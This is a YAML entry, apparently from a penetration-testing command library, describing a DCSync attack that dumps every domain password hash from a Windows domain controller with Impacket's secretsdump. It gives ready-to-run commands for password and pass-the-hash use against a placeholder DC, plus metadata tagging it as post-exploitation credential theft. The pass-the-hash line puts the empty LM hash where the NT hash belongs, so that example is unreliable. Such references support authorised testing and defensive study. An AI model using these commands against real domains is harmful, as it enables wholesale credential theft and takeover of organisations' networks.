---
description: |
  Perform a DCSync attack to dump all domain hashes using
  Impacket's secretsdump. Requires replication privileges
  (Domain Admin or equivalent).

  Reference values:
    Target DC: 10.10.10.1
    Domain: test.local
    Username: admin
    Password: password123
command: |
  # With password
  impacket-secretsdump test.local/admin:password123@10.10.10.1

  # With NTLM hash (Pass-the-Hash)
  impacket-secretsdump test.local/admin@10.10.10.1 -hashes :aad3b435b51404eeaad3b435b51404ee

  # Just NTDS.dit
  impacket-secretsdump test.local/admin:password123@10.10.10.1 -just-dc-ntlm
phase:
  - Post-Exploitation
target_os:
  - Windows
services:
  - LDAP
  - RPC
ports:
  - "389"
  - "135"
  - "445"
items:
  - Username
  - Password
  - Hash
techniques:
  - DCSync
  - Pass-the-Hash
network_position:
  - Internal
references:
  - https://github.com/fortra/impacket
---
